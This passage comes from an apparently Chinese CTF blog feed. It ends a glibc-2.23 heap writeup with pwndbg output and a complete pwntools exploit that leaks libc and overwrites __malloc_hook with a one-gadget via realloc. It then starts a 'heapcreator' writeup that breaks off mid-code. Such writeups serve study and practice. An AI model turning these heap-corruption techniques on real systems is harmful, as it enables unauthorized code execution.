class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class=\"line\"> RAX  <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RCX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x7f31162cc02a</span> (<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>) ◂— xor    esi, esi</span><br><span class=\"line\"> RDI  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R8   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x7f31163be6e0</span> (_nl_C_LC_CTYPE_class+<span class=\"number\">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class=\"line\"> R12  <span class=\"number\">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R13  <span class=\"number\">0x7ffedb4e1860</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7ffedb4e16a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"> RIP  <span class=\"number\">0x7f31162cb95d</span> (<span class=\"built_in\">realloc</span>+<span class=\"number\">589</span>) ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7f31162cb95d</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">589</span>&gt;    call   rax</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb95f</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">591</span>&gt;    mov    rbp, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb962</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">594</span>&gt;    jmp    <span class=\"built_in\">realloc</span>+<span class=\"number\">213</span> &lt;<span class=\"number\">0x7f31162cb7e5</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb967</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">599</span>&gt;    nop    word ptr [rax + rax]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb970</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">608</span>&gt;    mov    rax, qword ptr [rip + <span class=\"number\">0x33f501</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb977</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">615</span>&gt;    xor    ebp, ebp</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb979</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">617</span>&gt;    mov    dword ptr fs:[rax], <span class=\"number\">0xc</span></span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb980</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">624</span>&gt;    jmp    <span class=\"built_in\">realloc</span>+<span class=\"number\">213</span> &lt;<span class=\"number\">0x7f31162cb7e5</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb985</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">629</span>&gt;    nop    dword ptr [rax]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb988</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">632</span>&gt;    lea    rax, [r15 - <span class=\"number\">8</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb98c</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">636</span>&gt;    mov    rbp, rbx</span><br><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp  <span class=\"number\">0x7ffedb4e16a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│      <span class=\"number\">0x7ffedb4e16b0</span> —▸ <span class=\"number\">0x7f311681c700</span> ◂— <span class=\"number\">0x7f311681c700</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│      <span class=\"number\">0x7ffedb4e16b8</span> ◂— <span class=\"number\">9</span> <span class=\"comment\">/* &#x27;\\t&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│      <span class=\"number\">0x7ffedb4e16c0</span> —▸ <span class=\"number\">0x7f311660c6a3</span> (_IO_2_1_stdout_+<span class=\"number\">131</span>) ◂— <span class=\"number\">0x60d780000000000a</span> <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│      <span class=\"number\">0x7ffedb4e16c8</span> —▸ <span class=\"number\">0x7ffedb4e1860</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│      <span class=\"number\">0x7ffedb4e16d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓</span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f <span class=\"number\">0</span>     <span class=\"number\">7f</span>31162cb95d <span class=\"built_in\">realloc</span>+<span class=\"number\">589</span></span><br><span class=\"line\">   f <span class=\"number\">1</span>     <span class=\"number\">7f</span>31162cc02a <span class=\"built_in\">calloc</span>+<span class=\"number\">682</span></span><br><span class=\"line\">   f <span class=\"number\">2</span>     <span class=\"number\">55f</span>c4e86dcd1</span><br><span class=\"line\">   f <span class=\"number\">3</span>        <span class=\"number\">74e86</span>d9a0</span><br><span class=\"line\">   f <span class=\"number\">4</span>        <span class=\"number\">100000010</span></span><br><span class=\"line\">   f <span class=\"number\">5</span>        <span class=\"number\">100000006</span></span><br><span class=\"line\">   f <span class=\"number\">6</span> <span class=\"number\">54</span>a26cc778083a00</span><br><span class=\"line\">   f <span class=\"number\">7</span>     <span class=\"number\">7f</span>fedb4e1780</span><br><span class=\"line\">   f <span class=\"number\">8</span>     <span class=\"number\">55f</span>c4e86e258</span><br><span class=\"line\">   f <span class=\"number\">9</span>        <span class=\"number\">1</span>db4e1860</span><br><span class=\"line\">   f <span class=\"number\">10</span> <span class=\"number\">54</span>a26cc778083a00</span><br><span class=\"line\">Program received signal <span class=\"title function_\">SIGSEGV</span> <span class=\"params\">(fault address <span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span> 20</span><br><span class=\"line\">00:0000│ rsp  0x7ffedb4e16a0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">02:0010│      0x7ffedb4e16b0 —▸ 0x7f311681c700 ◂— 0x7f311681c700</span><br><span class=\"line\">03:0018│      0x7ffedb4e16b8 ◂— 9 <span class=\"comment\">/* &#x27;\\t&#x27; */</span></span><br><span class=\"line\">04:0020│      0x7ffedb4e16c0 —▸ 0<span class=\"title function_\">x7f311660c6a3</span> <span class=\"params\">(_IO_2_1_stdout_+<span class=\"number\">131</span>)</span> ◂— 0x60d780000000000a <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\">05:0028│      0x7ffedb4e16c8 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">06:0030│      0x7ffedb4e16d0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">08:0040│      0x7ffedb4e16e0 ◂— 0x10</span><br><span class=\"line\">09:0048│      0x7ffedb4e16e8 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">0a:0050│      0x7ffedb4e16f0 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">0b:0058│      0x7ffedb4e16f8 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">0d:0068│      0x7ffedb4e1708 —▸ 0<span class=\"title function_\">x7f31162cc02a</span> <span class=\"params\">(<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>)</span> ◂— xor    esi, esi</span><br><span class=\"line\">0e:0070│      0x7ffedb4e1710 ◂— 0x7</span><br><span class=\"line\">0f:0078│      0x7ffedb4e1718 ◂— 0x0</span><br><span class=\"line\">10:0080│      0x7ffedb4e1720 —▸ 0x7ffedb4e1760 —▸ 0x7ffedb4e1780 —▸ 0x55fc4e86e2c0 ◂— push   r15</span><br><span class=\"line\">11:0088│      0x7ffedb4e1728 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">12:0090│      0x7ffedb4e1730 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">13:0098│      0x7ffedb4e1738 —▸ 0x55fc4e86dcd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里 rsp+0x30 为 0，就满足了一个 onegadget.</p>\n<p>有时候 realloc 仍旧无法满足，那么我们尝试 realloc 偏移，realloc 调栈 的原理在于其调用 realloc_hook 前，会有多个 push 操作，利用这个可以是默写栈空间经过操作偏移后，满足要求。</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;node4.buuoj.cn&#x27;,29287)</span></span><br><span class=\"line\">r=process(<span class=\"string\">&quot;./roarctf&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./roarctf&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):\t</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b calloc&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xb0</span>)+<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x7f99de237b88</span>-<span class=\"number\">0x7f99dde73000</span></span><br><span class=\"line\">libc_base = addr -(<span class=\"number\">0x7f99de237b88</span>-<span class=\"number\">0x7f99dde73000</span>)+<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc_base+<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0x4527a</span>+libc_base</span><br><span class=\"line\">realloc = libc_base+ libc.symbols[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;main_arena : &quot;</span>,<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">1</span>,<span class=\"number\">0x88</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">17</span>+<span class=\"string\">b&#x27;\\x71&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>,p64(malloc_hook-<span class=\"number\">0x23</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">0x13</span>-<span class=\"number\">8</span>)+p64(onegadget)</span><br><span class=\"line\">payload +=p64(realloc)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x60</span>-<span class=\"built_in\">len</span>(payload)) </span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/20/buuoj-heapcreator/",
            "url": "http://example.com/2022/03/20/buuoj-heapcreator/",
            "title": "buuoj_heapcreator",
            "date_published": "2022-03-20T15:59:28.000Z",
            "content_html": "<h2 id=\"这次刷题记录开始着重整理下在glibc-223下的一些利用姿势\"><a class=\"markdownIt-Anchor\" href=\"#这次刷题记录开始着重整理下在glibc-223下的一些利用姿势\">#</a> 这次刷题记录开始着重整理下在 Glibc-2.23 下的一些利用姿势</h2>\n<p>说明下 buuoj 的一些不好的地方，buuoj 基本不会给 libc, 而有些没有后门的程序，往往需要去泄露 libc 的基地址，但是最近的一些题目很孬去匹配到正确的版本，我也就不清楚是什么问题了。这里就不过多赘述了，而匹配 libc 就不作为本文的一个要点。我们只要在本地同通过测试就好了</p>\n<h2 id=\"浅析\"><a class=\"markdownIt-Anchor\" href=\"#浅析\">#</a> 浅析</h2>\n<p>题目环境以及保护<br>\n ubuntu16</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec --file=heapcreator</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/buuoj/heapcreater/heapcreator&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br><span class=\"line\">$ file heapcreator </span><br><span class=\"line\">heapcreator: ELF <span class=\"number\">64</span>-bit LSB executable, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">5e69111</span>eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>程序呢并没有开启 full relro, 这里就首先反映到是不是可以修改函数的 got 表呢？根据题目描述，其实就已经断定了这是一个堆题。</p>\n<p>接下来我们就主要看看其逻辑思路了</p>\n<h3 id=\"main\"><a class=\"markdownIt-Anchor\" href=\"#main\">#</a> main</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu();</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( atoi(buf) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        create_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        edit_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">        show_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">        delete_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid Choice&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>经典的分支结构</p>\n<h3 id=\"menu\"><a class=\"markdownIt-Anchor\" href=\"#menu\">#</a> MENU</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;          Heap Creator          &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 5. Exit                        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"creat\"><a class=\"markdownIt-Anchor\" href=\"#creat\">#</a> Creat</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 